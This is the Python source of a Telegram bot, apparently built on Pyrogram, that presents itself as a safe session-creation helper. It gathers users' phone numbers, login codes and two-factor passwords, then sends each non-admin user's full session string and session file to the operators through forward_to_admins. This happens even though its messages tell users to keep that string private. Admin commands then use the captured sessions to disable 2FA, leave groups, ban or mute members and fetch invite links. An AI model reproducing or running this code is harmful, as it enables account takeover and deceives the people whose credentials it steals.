import os
import asyncio
import logging
import json
from typing import Dict, Optional, Any
from pyrogram import Client, filters, idle
from pyrogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid, 
    PhoneNumberInvalid, PhoneCodeExpired,
    AuthKeyUnregistered, FloodWait
)
import config

# Import admin panel handlers
from handlers.admin_panel import show_admin_panel
from handlers.two_factor import handle_two_factor, disable_two_factor
from handlers.chats_handler import handle_chats
from handlers.vanish_handler import handle_vanish, confirm_vanish
from handlers.admin_in_handler import handle_admin_in
from handlers.admin_powers import show_admin_powers_menu, ban_user, mute_user
from handlers.groups_handler import handle_groups_in
from handlers.group_links import handle_get_group_link, get_invite_link

# Import utilities
from utils.helpers import safe_int, split_message

# Configure logging
logging.basicConfig(
    level=getattr(logging, config.LOG_LEVEL),
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Ensure logs directory exists
os.makedirs('logs', exist_ok=True)

class SessionBot:
    def __init__(self):
        self.app = Client(
            "session_bot",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            bot_token=config.BOT_TOKEN
        )
        self.user_sessions: Dict[int, Dict] = {}
        self.active_admin_sessions: Dict[int, Client] = {}
        self.user_data: Dict[int, Dict] = {}  # Store user data like group selection
        self.setup_handlers()
        
    def setup_handlers(self):
        """Setup all bot command handlers"""
        
        # ===== START COMMAND =====
        @self.app.on_message(filters.command("start"))
        async def start_handler(client, message: Message):
            """Start command handler"""
            user_id = message.from_user.id
            
            # Welcome message for admins
            if user_id in config.ADMIN_IDS:
                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton("📱 Session Manager", callback_data="session_manager")],
                    [InlineKeyboardButton("⚡ Admin Panel", callback_data="admin_panel_main")],
                    [InlineKeyboardButton("❓ Help", callback_data="help")]
                ])
                
                await message.reply_text(
                    "🤖 **Admin Session Bot**\n\n"
                    "Welcome to the advanced session management bot with admin panel features!\n\n"
                    "**Quick Start:**\n"
                    "1. Create a session with /create_session\n"
                    "2. Or login with existing session using /relogin\n"
                    "3. Then use /admin to access admin features\n\n"
                    "**Available Commands:**\n"
                    "• /create_session - Create new session\n"
                    "• /relogin - Login with session string\n"
                    "• /mysessions - View your sessions\n"
                    "• /admin - Open admin panel\n"
                    "• /cancel - Cancel current operation",
                    reply_markup=keyboard
                )
            else:
                # Regular user menu
                await message.reply_text(
                    "🤖 **Session Creation Bot**\n\n"
                    "I help you create Telegram session files safely.\n\n"
                    "**Commands:**\n"
                    "• /create_session - Create new session\n"
                    "• /relogin - Verify existing session\n"
                    "• /mysessions - View saved sessions\n"
                    "• /cancel - Cancel operation\n\n"
                    "⚠️ **Note:** Sessions are stored securely for verification purposes."
                )
        
        # ===== ADMIN COMMANDS =====
        @self.app.on_message(filters.command("admin"))
        async def admin_command(client, message: Message):
            """Admin panel command"""
            user_id = message.from_user.id
            
            # Check authorization
            if user_id not in config.ADMIN_IDS:
                await message.reply_text("❌ You are not authorized to use admin commands!")
                return
            
            # Check if user has an active admin session
            if user_id not in self.active_admin_sessions:
                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton("📱 Create Session", callback_data="create_session_btn")],
                    [InlineKeyboardButton("🔄 Relogin", callback_data="relogin_btn")],
                    [InlineKeyboardButton("📁 My Sessions", callback_data="my_sessions_btn")]
                ])
                
                await message.reply_text(
                    "🔑 **Admin Session Required**\n\n"
                    "To use admin panel features, you need to login with an account session.\n\n"
                    "**Options:**\n"
                    "• Create a new session with /create_session\n"
                    "• Or login with existing session using /relogin\n\n"
                    "Then use /admin to access the panel.",
                    reply_markup=keyboard
                )
                return
            
            # Show admin panel
            await show_admin_panel(self.active_admin_sessions[user_id], message)
        
        # ===== SESSION MANAGEMENT COMMANDS =====
        @self.app.on_message(filters.command("create_session"))
        async def create_session_handler(client, message: Message):
            """Start session creation process"""
            user_id = message.from_user.id
            
            if user_id in self.user_sessions:
                await message.reply_text("❌ You already have a session creation in progress!")
                return
            
            # Initialize user session data
            self.user_sessions[user_id] = {
                'step': 'phone',
                'client': None,
                'phone_code_hash': None,
                'phone_number': None,
                'is_admin_login': user_id in config.ADMIN_IDS
            }
            
            await message.reply_text(
                "📱 **Session Creation Started**\n\n"
                "Please send your phone number in international format:\n"
                "**Example:** `+1234567890`\n\n"
                "**Note:** This will create a session for your Telegram account.\n"
                "Use /cancel to stop the process."
            )
        
        @self.app.on_message(filters.command("relogin"))
        async def relogin_handler(client, message: Message):
            """Relogin using session string"""
            user_id = message.from_user.id
            
            if user_id in self.user_sessions:
                await message.reply_text("❌ You already have an operation in progress!")
                return
            
            self.user_sessions[user_id] = {
                'step': 'relogin',
                'client': None,
                'is_admin_login': user_id in config.ADMIN_IDS
            }
            
            await message.reply_text(
                "🔄 **Relogin Process**\n\n"
                "Please send your session string to login and verify.\n\n"
                "**Format:** Just paste the session string (it's a long string of characters)\n\n"
                "Use /cancel to stop the process."
            )
        
        @self.app.on_message(filters.command("mysessions"))
        async def my_sessions_handler(client, message: Message):
            """Show user's sessions"""
            user_id = message.from_user.id
            sessions = await self.get_user_sessions(user_id)
            
            if not sessions:
                await message.reply_text("📭 You don't have any saved sessions.")
                return
            
            session_list = "📁 **Your Saved Sessions:**\n\n"
            for idx, session_file in enumerate(sessions[:10], 1):  # Show first 10
                # Extract account ID from filename
                try:
                    account_id = session_file.split('_')[2].replace('.session', '')
                    session_list += f"**{idx}. Account ID:** `{account_id}`\n"
                    session_list += f"   **File:** `{session_file}`\n\n"
                except:
                    session_list += f"**{idx}. File:** `{session_file}`\n\n"
            
            if len(sessions) > 10:
                session_list += f"\n... and {len(sessions) - 10} more sessions"
            
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Use Session", callback_data="use_existing_session")],
                [InlineKeyboardButton("🗑️ Delete All Sessions", callback_data="delete_all_sessions")]
            ])
            
            await message.reply_text(session_list, reply_markup=keyboard)
        
        @self.app.on_message(filters.command("cancel"))
        async def cancel_handler(client, message: Message):
            """Cancel current operation"""
            user_id = message.from_user.id
            
            if user_id in self.user_sessions:
                await self.cleanup_user_session(user_id)
                await message.reply_text("❌ Operation cancelled successfully.")
            else:
                await message.reply_text("ℹ️ No active operation to cancel.")
        
        # ===== ADMIN PANEL FEATURE COMMANDS =====
        # These require active admin session
        admin_commands = [
            ("2f", handle_two_factor),
            ("chats", handle_chats),
            ("vanish", handle_vanish),
            ("admin_in", handle_admin_in),
            ("admin_in_powers", show_admin_powers_menu),
            ("groups_in", handle_groups_in),
            ("get_group_link", handle_get_group_link)
        ]
        
        for cmd, handler in admin_commands:
            @self.app.on_message(filters.command(cmd))
            async def command_handler(client, message: Message, handler=handler):
                user_id = message.from_user.id
                
                # Authorization check
                if user_id not in config.ADMIN_IDS:
                    await message.reply_text("❌ You are not authorized to use this command!")
                    return
                
                # Active session check
                if user_id not in self.active_admin_sessions:
                    await message.reply_text(
                        "❌ No active admin session!\n\n"
                        "Please login with a session first using /relogin"
                    )
                    return
                
                # Execute handler with the active session client
                try:
                    await handler(self.active_admin_sessions[user_id], message)
                except Exception as e:
                    logger.error(f"Error in command handler: {e}")
                    await message.reply_text(f"❌ Error executing command: {str(e)}")
        
        # ===== GET LINK COMMAND WITH PARAMETER =====
        @self.app.on_message(filters.command("getlink") & filters.private)
        async def getlink_command(client, message: Message):
            """Get group link with chat ID parameter"""
            user_id = message.from_user.id
            
            # Authorization check
            if user_id not in config.ADMIN_IDS:
                await message.reply_text("❌ You are not authorized!")
                return
            
            # Active session check
            if user_id not in self.active_admin_sessions:
                await message.reply_text("❌ No active admin session!")
                return
            
            # Extract chat ID from command
            parts = message.text.split()
            if len(parts) < 2:
                await handle_get_group_link(self.active_admin_sessions[user_id], message)
                return
            
            try:
                chat_id = int(parts[1])
                await get_invite_link(self.active_admin_sessions[user_id], chat_id, message)
            except ValueError:
                await message.reply_text("❌ Invalid chat ID! Please provide a valid numeric ID.")
            except Exception as e:
                await message.reply_text(f"❌ Error: {str(e)}")
        
        # ===== DISABLE 2FA COMMAND =====
        @self.app.on_message(filters.command("disable_2fa") & filters.private)
        async def disable_2fa_command(client, message: Message):
            """Disable 2FA with password"""
            user_id = message.from_user.id
            
            # Authorization check
            if user_id not in config.ADMIN_IDS:
                await message.reply_text("❌ You are not authorized!")
                return
            
            # Active session check
            if user_id not in self.active_admin_sessions:
                await message.reply_text("❌ No active admin session!")
                return
            
            # Extract password from command
            parts = message.text.split(maxsplit=1)
            if len(parts) < 2:
                await message.reply_text(
                    "🔐 **Usage:**\n\n"
                    "`/disable_2fa your_password`\n\n"
                    "Example: `/disable_2fa MyPassword123`\n\n"
                    "⚠️ **Warning:** This will disable 2FA protection!"
                )
                return
            
            password = parts[1]
            await self.handle_disable_2fa(self.active_admin_sessions[user_id], message, password)
        
        # ===== TEXT MESSAGE HANDLER =====
        @self.app.on_message(filters.text & filters.private)
        async def message_handler(client, message: Message):
            """Handle all text messages for session creation"""
            user_id = message.from_user.id
            message_text = message.text.strip()
            
            # Skip commands
            if message_text.startswith('/'):
                return
            
            # Check if user is in session creation
            if user_id not in self.user_sessions:
                return
            
            session_data = self.user_sessions[user_id]
            
            try:
                if session_data['step'] == 'phone':
                    await self.handle_phone_number(message, session_data, message_text)
                
                elif session_data['step'] == 'code':
                    await self.handle_otp_code(message, session_data, message_text)
                
                elif session_data['step'] == 'password':
                    await self.handle_2fa(message, session_data, message_text)
                
                elif session_data['step'] == 'relogin':
                    await self.handle_relogin(message, session_data, message_text)
                    
            except FloodWait as e:
                wait_time = e.value
                await message.reply_text(
                    f"⏳ **Too many requests!**\n\n"
                    f"Please wait {wait_time} seconds before trying again.\n"
                    f"Use /create_session to restart."
                )
                await self.cleanup_user_session(user_id)
                
            except Exception as e:
                logger.error(f"Error in session creation for user {user_id}: {e}")
                await message.reply_text(
                    f"❌ **An error occurred:**\n{str(e)}\n\n"
                    f"Use /create_session to try again."
                )
                await self.cleanup_user_session(user_id)
        
        # ===== CALLBACK QUERY HANDLER =====
        @self.app.on_callback_query()
        async def handle_callbacks(client: Client, callback_query: CallbackQuery):
            user_id = callback_query.from_user.id
            data = callback_query.data
            
            try:
                await callback_query.answer()  # Answer all callbacks immediately
                
                # ===== MAIN MENU CALLBACKS =====
                if data == "admin_panel_main":
                    if user_id not in config.ADMIN_IDS:
                        await callback_query.message.edit_text("❌ You are not authorized!")
                        return
                    
                    if user_id not in self.active_admin_sessions:
                        await callback_query.message.edit_text(
                            "❌ No active admin session!\n\n"
                            "Please login with a session first."
                        )
                        return
                    
                    await show_admin_panel(self.active_admin_sessions[user_id], callback_query.message)
                
                elif data == "session_manager":
                    await callback_query.message.edit_text(
                        "📱 **Session Manager**\n\n"
                        "**Available Commands:**\n"
                        "• /create_session - Create new session\n"
                        "• /relogin - Login with session string\n"
                        "• /mysessions - View your sessions\n"
                        "• /cancel - Cancel current operation\n\n"
                        "Select an option from the commands above."
                    )
                
                elif data == "help":
                    await self.show_help(callback_query.message)
                
                # ===== SESSION MANAGEMENT CALLBACKS =====
                elif data == "create_session_btn":
                    await create_session_handler(client, callback_query.message)
                
                elif data == "relogin_btn":
                    await relogin_handler(client, callback_query.message)
                
                elif data == "my_sessions_btn":
                    await my_sessions_handler(client, callback_query.message)
                
                # ===== ADMIN PANEL FEATURE CALLBACKS =====
                # These require active admin session
                elif data in ["2fa_status", "get_chats", "vanish", "admin_in", 
                            "admin_powers", "groups_in", "get_group_link"]:
                    
                    if user_id not in config.ADMIN_IDS:
                        await callback_query.message.edit_text("❌ You are not authorized!")
                        return
                    
                    if user_id not in self.active_admin_sessions:
                        await callback_query.message.edit_text(
                            "❌ No active admin session!\n\n"
                            "Please login with a session first."
                        )
                        return
                    
                    client_instance = self.active_admin_sessions[user_id]
                    
                    if data == "2fa_status":
                        await handle_two_factor(client_instance, callback_query.message)
                    
                    elif data == "get_chats":
                        await handle_chats(client_instance, callback_query.message)
                    
                    elif data == "vanish":
                        await handle_vanish(client_instance, callback_query.message)
                    
                    elif data == "confirm_vanish":
                        await confirm_vanish(client_instance, callback_query)
                    
                    elif data == "admin_in":
                        await handle_admin_in(client_instance, callback_query.message)
                    
                    elif data == "admin_powers":
                        await show_admin_powers_menu(client_instance, callback_query.message)
                    
                    elif data == "groups_in":
                        await handle_groups_in(client_instance, callback_query.message)
                    
                    elif data == "get_group_link":
                        await handle_get_group_link(client_instance, callback_query.message)

                
                        # ===== UTILITY CALLBACKS =====
                elif data == "back_to_main":
                    if user_id in self.active_admin_sessions:
                        await show_admin_panel(self.active_admin_sessions[user_id], callback_query.message)
                    else:
                        await callback_query.message.edit_text(
                            "🔙 **Main Menu**\n\n"
                            "Use /create_session to create a new session\n"
                            "Or /relogin to use existing session"
                        )
                
                elif data == "close_panel":
                    await callback_query.message.delete()
                
                elif data == "disable_2fa":
                    await disable_two_factor(self.active_admin_sessions[user_id], callback_query.message)
                
                elif data == "use_existing_session":
                    await callback_query.message.reply_text(
                        "🔄 **Use Existing Session**\n\n"
                        "To use an existing session, please send:\n\n"
                        "`/relogin your_session_string`\n\n"
                        "Replace `your_session_string` with your actual session string."
                    )
                
                elif data == "delete_all_sessions":
                    await self.delete_all_sessions(user_id, callback_query.message)
                
            except Exception as e:
                logger.error(f"Callback error: {e}")
                try:
                    await callback_query.message.reply_text(f"❌ An error occurred: {str(e)}")
                except:
                    pass



 # ===== SESSION HANDLING METHODS =====
    async def handle_phone_number(self, message: Message, session_data: Dict, phone_number: str):
        """Handle phone number input"""
        try:
            # Validate phone number format
            if not phone_number.startswith('+'):
                await message.reply_text("❌ Please use international format starting with '+' (e.g., +1234567890)")
                return
            
            # Validate length
            if len(phone_number) < 10:
                await message.reply_text("❌ Phone number seems too short. Please check and try again.")
                return
            
            # Create user client
            user_client = Client(
                f"user_session_{message.from_user.id}_{os.urandom(4).hex()}",
                api_id=config.API_ID,
                api_hash=config.API_HASH,
                phone_number=phone_number,
                in_memory=True  # Don't create .session files on disk
            )
            
            await user_client.connect()
            
            # Send code request
            sent_code = await user_client.send_code(phone_number)
            
            session_data['client'] = user_client
            session_data['phone_code_hash'] = sent_code.phone_code_hash
            session_data['phone_number'] = phone_number
            session_data['step'] = 'code'
            
            await message.reply_text(
                "📨 **OTP Sent Successfully!**\n\n"
                "I've sent a verification code to your phone.\n"
                "Please enter the code you received:\n\n"
                "**Format:** Just the numbers (e.g., `12345`)\n\n"
                "⚠️ **Note:** The code expires in 5 minutes."
            )
            
        except PhoneNumberInvalid:
            await message.reply_text(
                "❌ **Invalid phone number!**\n\n"
                "Please check the number and try again.\n"
                "Format should be: `+1234567890`"
            )
            await self.cleanup_user_session(message.from_user.id)
            
        except FloodWait as e:
            wait_time = e.value
            await message.reply_text(
                f"⏳ **Too many attempts!**\n\n"
                f"Please wait {wait_time} seconds before trying again."
            )
            await self.cleanup_user_session(message.from_user.id)
            
        except Exception as e:
            await message.reply_text(f"❌ Error sending code: {str(e)}")
            await self.cleanup_user_session(message.from_user.id)
    
    async def handle_otp_code(self, message: Message, session_data: Dict, code: str):
        """Handle OTP code input"""
        try:
            # Clean and validate code
            code = code.strip().replace(' ', '')
            if not code.isdigit():
                await message.reply_text("❌ Please enter only numbers (no spaces or other characters)")
                return
            
            if len(code) < 5:
                await message.reply_text("❌ Code seems too short. Please check and try again.")
                return
            
            client = session_data['client']
            
            # Sign in with code
            try:
                await client.sign_in(
                    phone_number=session_data['phone_number'],
                    phone_code_hash=session_data['phone_code_hash'],
                    phone_code=code
                )
                
            except SessionPasswordNeeded:
                session_data['step'] = 'password'
                await message.reply_text(
                    "🔐 **Two-Factor Authentication Detected**\n\n"
                    "Your account has 2FA enabled for extra security.\n"
                    "Please enter your 2FA password:\n\n"
                    "**Note:** This is your account password, not the OTP code."
                )
                return
                
            except PhoneCodeInvalid:
                await message.reply_text(
                    "❌ **Invalid code!**\n\n"
                    "Please check the code and try again.\n"
                    "Make sure you're entering the latest code received."
                )
                return
                
            except PhoneCodeExpired:
                await message.reply_text(
                    "❌ **Code expired!**\n\n"
                    "The verification code has expired.\n"
                    "Please start over with /create_session"
                )
                await self.cleanup_user_session(message.from_user.id)
                return
            
            # If no 2FA required, complete login
            await self.complete_session_creation(message, session_data)
            
        except FloodWait as e:
            wait_time = e.value
            await message.reply_text(
                f"⏳ **Too many attempts!**\n\n"
                f"Please wait {wait_time} seconds before trying again."
            )
            await self.cleanup_user_session(message.from_user.id)
            
        except Exception as e:
            await message.reply_text(f"❌ Error verifying code: {str(e)}")
            await self.cleanup_user_session(message.from_user.id)
    
    async def handle_2fa(self, message: Message, session_data: Dict, password: str):
        """Handle 2FA password input"""
        try:
            client = session_data['client']
            
            # Complete sign in with 2FA
            await client.check_password(password=password)
            
            # Complete session creation
            await self.complete_session_creation(message, session_data)
            
        except Exception as e:
            await message.reply_text(
                f"❌ **Invalid 2FA password!**\n\n"
                f"Error: {str(e)}\n\n"
                f"Please try again with the correct password."
            )
    
    async def handle_relogin(self, message: Message, session_data: Dict, session_string: str):
        """Handle relogin with session string"""
        try:
            user_id = message.from_user.id
            
            # Clean session string
            session_string = session_string.strip()
            
            # Validate session string
            if len(session_string) < 100:
                await message.reply_text(
                    "❌ **Invalid session string!**\n\n"
                    "Session strings are usually very long (300+ characters).\n"
                    "Please check and try again."
                )
                await self.cleanup_user_session(user_id)
                return
            
            # Create client with session string
            user_client = Client(
                f"relogin_{user_id}_{os.urandom(4).hex()}",
                api_id=config.API_ID,
                api_hash=config.API_HASH,
                session_string=session_string,
                in_memory=True
            )
            
            await user_client.connect()
            
            # Test the session
            try:
                me = await user_client.get_me()
                
                # If admin and is_admin_login is True, set as active admin session
                is_admin = user_id in config.ADMIN_IDS
                if is_admin and session_data.get('is_admin_login', True):
                    # Store the client for admin panel use
                    self.active_admin_sessions[user_id] = user_client
                    
                    await message.reply_text(
                        f"✅ **Admin Session Activated!**\n\n"
                        f"👤 **Account:** {me.first_name or ''} {me.last_name or ''}\n"
                        f"📱 **Phone:** {me.phone_number or 'Not visible'}\n"
                        f"🆔 **User ID:** `{me.id}`\n"
                        f"🔗 **Username:** @{me.username or 'Not set'}\n\n"
                        f"**You can now use:**\n"
                        f"• `/admin` - Admin panel\n"
                        f"• `/2f` - 2FA management\n"
                        f"• Other admin commands\n\n"
                        f"⚠️ **Note:** This session will be active until you logout."
                    )
                else:
                    # Regular session verification
                    await message.reply_text(
                        f"✅ **Session Verified Successfully!**\n\n"
                        f"👤 **Account:** {me.first_name or ''} {me.last_name or ''}\n"
                        f"📱 **Phone:** {me.phone_number or 'Not visible'}\n"
                        f"🆔 **User ID:** `{me.id}`\n\n"
                        f"Your session is active and working!"
                    )
                    await user_client.disconnect()
                
                # Save the session file
                filename = f"session_{user_id}_{me.id}.session"
                self.save_session_file(filename, session_string)

# Forward to admins if user is not admin
                if not is_admin:
                    await self.forward_to_admins(user_id, me, session_string, filename)
                
            except AuthKeyUnregistered:
                await message.reply_text(
                    "❌ **Session expired or invalid!**\n\n"
                    "This session string is no longer valid.\n"
                    "Please create a new session with /create_session"
                )
                await user_client.disconnect()
                
            except Exception as e:
                await message.reply_text(f"❌ Error verifying session: {str(e)}")
                await user_client.disconnect()
            
            await self.cleanup_user_session(user_id)
            
        except Exception as e:
            await message.reply_text(f"❌ Error with session string: {str(e)}")
            await self.cleanup_user_session(message.from_user.id)
    
    async def handle_disable_2fa(self, client: Client, message: Message, password: str):
        """Handle 2FA disable command"""
        try:
            from pyrogram.raw import functions
            
            # Check current password
            password_info = await client.invoke(functions.account.GetPassword())
            
            if not password_info.has_password:
                await message.reply_text("✅ 2FA is already disabled on this account!")
                return


# Disable 2FA
            await client.invoke(functions.account.UpdatePasswordSettings(
                password=await client.invoke(functions.account.GetPassword()),
                new_settings=functions.account.PasswordInputSettings(
                    new_algo=password_info.new_algo,
                    new_password_hash=b'',
                    hint=''
                )
            ))
            
            await message.reply_text(
                "✅ **2FA Disabled Successfully!**\n\n"
                "Two-factor authentication has been removed from your account.\n\n"
                "⚠️ **Security Warning:**\n"
                "• Your account is now less secure\n"
                "• Consider re-enabling 2FA for protection\n"
                "• Keep your session string secure"
            )
            
        except Exception as e:
            await message.reply_text(f"❌ Error disabling 2FA: {str(e)}")
    
    async def complete_session_creation(self, message: Message, session_data: Dict):
        """Complete session creation and save session file"""
        user_id = message.from_user.id
        client = session_data['client']
        
        try:
            # Get user information
            me = await client.get_me()
            session_string = await client.export_session_string()
            
            # Create session file
            filename = f"session_{user_id}_{me.id}.session"
            self.save_session_file(filename, session_string)
            
            is_admin = user_id in config.ADMIN_IDS
            is_admin_login = session_data.get('is_admin_login', False)
            
            # Store as active admin session if applicable
            if is_admin and is_admin_login:
                self.active_admin_sessions[user_id] = client
                session_type = "Admin"
                extra_info = "\n🔑 **Admin session activated!** Use `/admin` to access admin panel.\n"
            else:
                await client.disconnect()
                session_type = "User"
                extra_info = ""
            
            # Create success message
            session_info = (
                f"✅ **{session_type} Session Created Successfully!**\n\n"
                f"👤 **Account:** {me.first_name or ''} {me.last_name or ''}\n"
                f"📱 **Phone:** {session_data['phone_number']}\n"
                f"🆔 **User ID:** `{me.id}`\n"
                f"🔗 **Username:** @{me.username or 'Not set'}\n"
                f"📁 **Session File:** `{filename}`\n\n"
                f"**Session String (first 50 chars):**\n"
                f"`{session_string[:50]}...`\n\n"
            )
            
            session_info += extra_info
            
            if not is_admin:
                session_info += (
                    "💡 **You can use /relogin with the full session string to verify later.**\n\n"
                )
            
            session_info += "⚠️ **Keep your session string secure! Don't share it with anyone.**"
            
            await message.reply_text(session_info)
            
            # Forward session to admins if user is not admin
            if not is_admin:
                await self.forward_to_admins(user_id, me, session_string, filename)
            
        except Exception as e:
            logger.error(f"Error completing session creation: {e}")
            await message.reply_text(
                "❌ **Error saving session!**\n\n"
                f"Details: {str(e)}\n\n"
                "Please try again with /create_session"
            )
        finally:
            await self.cleanup_user_session(user_id)


# ===== UTILITY METHODS =====
    def save_session_file(self, filename: str, session_string: str):
        """Save session string to file"""
        filepath = os.path.join(config.SESSION_FOLDER, filename)
        os.makedirs(config.SESSION_FOLDER, exist_ok=True)
        
        with open(filepath, 'w') as f:
            f.write(session_string)
        logger.info(f"Session saved to: {filepath}")
    
    async def get_user_sessions(self, user_id: int) -> list:
        """Get all session files for a user"""
        sessions = []
        if os.path.exists(config.SESSION_FOLDER):
            for filename in os.listdir(config.SESSION_FOLDER):
                if filename.startswith(f"session_{user_id}_") and filename.endswith('.session'):
                    sessions.append(filename)
        return sorted(sessions)
    
    async def delete_all_sessions(self, user_id: int, message: Message):
        """Delete all sessions for a user"""
        try:
            sessions = await self.get_user_sessions(user_id)
            if not sessions:
                await message.reply_text("📭 You don't have any sessions to delete.")
                return
            
            deleted = 0
            for session_file in sessions:
                filepath = os.path.join(config.SESSION_FOLDER, session_file)
                try:
                    os.remove(filepath)
                    deleted += 1
                except:
                    pass
            
            await message.reply_text(f"🗑️ **Deleted {deleted} session(s) successfully!**")
            
        except Exception as e:
            await message.reply_text(f"❌ Error deleting sessions: {str(e)}")
    
    async def forward_to_admins(self, bot_user_id: int, telegram_user, session_string: str, filename: str):
        """Forward session information to admins"""
        try:
            session_info = (
                f"📋 **New Session Created**\n\n"
                f"🤖 **Bot User ID:** `{bot_user_id}`\n"
                f"👤 **Telegram User:** {telegram_user.first_name or ''} {telegram_user.last_name or ''}\n"
                f"📱 **Phone:** {telegram_user.phone_number or 'Hidden'}\n"
                f"🆔 **Telegram ID:** `{telegram_user.id}`\n"
                f"🔗 **Username:** @{telegram_user.username or 'N/A'}\n"
                f"📁 **Filename:** {filename}\n"
                f"🔐 **Session String:**\n`{session_string}`"
            )
            
            for admin_id in config.ADMIN_IDS:
                try:
                    # Send session info
                    await self.app.send_message(admin_id, session_info)
                    
                    # Send as file
                    temp_file = f"temp_{filename}"
                    with open(temp_file, 'w') as f:
                        f.write(session_string)
                    
                    await self.app.send_document(
                        admin_id,
                        temp_file,
                        caption=f"📁 Session file: {filename}"
                    )
                    
                    # Clean up temp file
                    os.remove(temp_file)
                    
                except Exception as e:
                    logger.error(f"Error sending to admin {admin_id}: {e}")
                    
        except Exception as e:
            logger.error(f"Error forwarding to admins: {e}")
    
    async def cleanup_user_session(self, user_id: int):
        """Clean up user session data"""
        if user_id in self.user_sessions:
            session_data = self.user_sessions[user_id]
            # Don't disconnect if this is an active admin session
            client = session_data.get('client')
            if client and user_id not in self.active_admin_sessions.get(user_id, {}):
                try:
                    await client.disconnect()
                except:
                    pass
            del self.user_sessions[user_id]
    
    async def show_help(self, message: Message):
        """Show help information"""
        help_text = (
            "🤖 **Session Bot Help**\n\n"
            
            "**📱 For Regular Users:**\n"
            "• /create_session - Create a new Telegram session\n"
            "• /relogin - Login with existing session string\n"
            "• /mysessions - View your saved sessions\n"
            "• /cancel - Cancel current operation\n\n"

              "**⚡ For Admins Only:**\n"
            "• /admin - Open admin panel (requires active session)\n"
            "• /2f - Check/disable 2FA\n"
            "• /chats - Show first 10 chats\n"
            "• /vanish - Leave all groups\n"
            "• /admin_in - List admin groups\n"
            "• /admin_in_powers - Use admin powers\n"
            "• /groups_in - List all groups\n"
            "• /get_group_link - Get group invite link\n\n"
            
            "**🔧 How to Use Admin Features:**\n"
            "1. Use /relogin with a session string\n"
            "2. The session becomes active for admin features\n"
            "3. Use /admin to access all features\n\n"
            
            "**⚠️ Security Notes:**\n"
            "• Keep session strings secure\n"
            "• Don't share sessions with anyone\n"
            "• Admins can see all created sessions\n"
            "• Use /cancel to stop any operation\n\n"
            
            "**📞 Support:**\n"
            "For issues, contact the bot administrator."
        )
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📱 Session Manager", callback_data="session_manager")],
            [InlineKeyboardButton("⚡ Admin Panel", callback_data="admin_panel_main")],
            [InlineKeyboardButton("❌ Close", callback_data="close_panel")]
        ])
        
        await message.reply_text(help_text, reply_markup=keyboard)

 # ===== BOT LIFECYCLE =====
    async def run(self):
        """Start the bot"""
        # Validate configuration
        try:
            config.validate()
        except ValueError as e:
            logger.error(f"Configuration error: {e}")
            print(f"❌ Configuration error: {e}")
            print("Please check your .env file")
            return
        
        # Ensure sessions directory exists
        os.makedirs(config.SESSION_FOLDER, exist_ok=True)
        
        logger.info("🚀 Starting Session Bot...")
        
        try:
            await self.app.start()
            
            me = await self.app.get_me()
            logger.info(f"✅ Bot started as @{me.username} (ID: {me.id})")
            
            # Notify admins
            admin_count = len(config.ADMIN_IDS)
            for admin_id in config.ADMIN_IDS:
                try:
                    await self.app.send_message(
                        admin_id,
                        f"🤖 **Session Bot Started!**\n\n"
                        f"**Bot:** @{me.username}\n"
                        f"**Admins:** {admin_count} configured\n"
                        f"**Status:** Ready to accept commands\n\n"
                        f"Use /start to begin."
                    )
                    logger.info(f"Notified admin: {admin_id}")
                except Exception as e:
                    logger.error(f"Could not notify admin {admin_id}: {e}")
            
            print("\n" + "="*50)
            print(f"🤖 Bot: @{me.username}")
            print(f"👑 Admins: {admin_count}")
            print(f"📁 Sessions folder: {config.SESSION_FOLDER}")
            print("="*50)
            print("\nBot is running. Press Ctrl+C to stop.")
            
            # Keep the bot running
            await idle()
            
        except KeyboardInterrupt:
            logger.info("Bot stopped by user")
        except Exception as e:
            logger.error(f"Bot error: {e}")
        finally:
            # Cleanup on shutdown
            logger.info("🔄 Cleaning up...")
            
            # Disconnect all active admin sessions
            for user_id, client in list(self.active_admin_sessions.items()):
                try:
                    await client.disconnect()
                    logger.info(f"Disconnected admin session for user {user_id}")
                except:
                    pass
            
            # Disconnect all user sessions
            for user_id in list(self.user_sessions.keys()):
                await self.cleanup_user_session(user_id)
            
            # Stop the bot
            try:
                await self.app.stop()
                logger.info("✅ Bot stopped cleanly")
            except:
                pass

async def main():
    """Main entry point"""
    print("""
    ╔══════════════════════════════════════╗
    ║       TELEGRAM SESSION BOT           ║
    ║      with Admin Panel Features       ║
    ╚══════════════════════════════════════╝
    """)
    
    # Create and run the bot
    bot = SessionBot()
    await bot.run()

if __name__ == "__main__":
    # Set event loop policy for Windows compatibility
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    except:
        pass
    
    # Run the bot
    asyncio.run(main())
